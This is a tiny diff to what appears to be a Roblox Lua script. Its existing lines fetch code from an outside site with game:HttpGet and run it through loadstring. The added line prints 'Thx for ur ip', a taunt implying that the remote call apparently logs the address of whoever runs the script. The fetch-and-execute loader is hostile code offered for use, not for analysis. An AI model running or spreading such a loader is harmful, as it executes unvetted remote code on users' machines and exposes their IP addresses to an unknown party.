@@ -1,3 +1,4 @@
+print"Thx for ur ip"
 loadstring(game:HttpGet("https://fortnitechat.site/6BH47V", true))()
 wait(3)
 getgenv().mainKey = "nil"
